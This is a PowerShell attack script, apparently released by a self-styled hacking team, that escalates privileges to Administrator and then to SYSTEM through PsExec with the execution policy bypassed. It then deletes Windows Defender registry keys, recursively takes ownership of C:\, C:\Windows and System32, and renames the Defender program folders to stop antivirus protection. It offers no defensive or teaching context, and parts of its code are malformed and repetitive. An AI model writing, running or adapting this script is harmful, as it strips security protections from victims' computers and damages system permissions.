#!-.ps1 
#
# Author : P.Hoogeveem
# Aka    : x0xr00t
# Build  : -
# Name   : Sl0ppy-ntc

write-host ""
write-host ""
write-host " { sl0p [0] Checking If We Got NT_Authority\system}"
write-host ""
write-host ""
if(-Not $($(whoami) -eq "nt authority\system")) {
    $IsSystem = $false

    # Elevate to admin (needed when called after reboot)
    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
         Write-Host "    [Sl0ppyr00t {0}] Elevate to Administrator"
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

    # Elevate to SYSTEM if psexec is available 
    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
    if($psexec_path) {
        Write-Host "    [Sl0ppyr00t {0}] Elevate to SYSTEM"
        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
        Start-Process -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    } else {
        Write-Host "    [Sl0ppyr00t {0}] PsExec not found, will continue as Administrator"
            }

} else {
    $IsSystem = $true
	write-host ""
	write-host ""
    write-host " { Sl0p [0]} NT_Authority\system ==: {$IsSystem}"
	write-host ""
	write-host ""
	sleep 3
	write-host " { sl0p [!] Evil Laughs, W3 G07 NT_Authority\system}" 
	write-host ""
}

#net localgroup "Group" "User" /add
write-host "" 
write-host " { sl0p [*]} proudly presented by team sl0ppyr00t"
write-host " sl0ppyr00t cause we always take them null levels ,spray em with nulls till we nullified our selfs a null access "
write-host ""
write-host " { sl0p [*]} We Will Exec Codes As NT From Here On { [!] Aye}"
sleep 3

write-host " { sl0p } Removing register files defender"
#remove local machine defender keys
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Miscellaneous" Configuration -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\MpEngine" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\NIS -Force" -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Quarantine" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Remediation" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Reporting" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Scan" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Signature Updates" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Spynet" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Threats" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\UX Configuration" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\WCOS" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard" -Force -Verbose
Remove-Item -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\" -Force -Verbose
#
Remove-Item -Path "HKEY_CLASS_ROOT\windowsdefender\Exclusions" -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions -Force -Verbose
write-host ""
write-host "renaming C:\Program Files (x86)\Windows Defender >> C:\Program Files (x86)\Windows fuck"
rename-item "C:\Program Files (x86)\Windows Defender" "C:\Program Files (x86)\Windows fuck"
ls "C:\Program Files (x86)\"
write-host ""
write-host "Takeown : c:\"
takeown.exe /F "C:\" /A /R /D N
write-host "Takeown : c:\windows\"
takeown.exe /F "C:\Windows\" /A /R /D N
write-host "Takeown : c:\windows\system32\"
takeown.exe /F "C:\Windows\System32" /A /R /D N
write-host "Takeown : C:\ProgramData\Microsoft\Windows Defender"
takeown.exe /F "C:\ProgramData\Microsoft\Windows Defender" /A /R /D N
sleep 5
write-host ""
write-host ""
write-host "renaming C:\Program Files\Windows Defender >> C:\Program Files\Windows fuck"
rename-item "C:\Program Files (x86)\Windows Defender" "C:\Program Files (x86)\Windows fuck"
ls "C:\Program Files\"
write-host ""
write-host ""
write-host "renamming C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsoft\Windows fuck"
rename-item "C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsoft\Windows fuck"
ls "C:\ProgramData\Microsoft\"
write-host ""
write-host ""

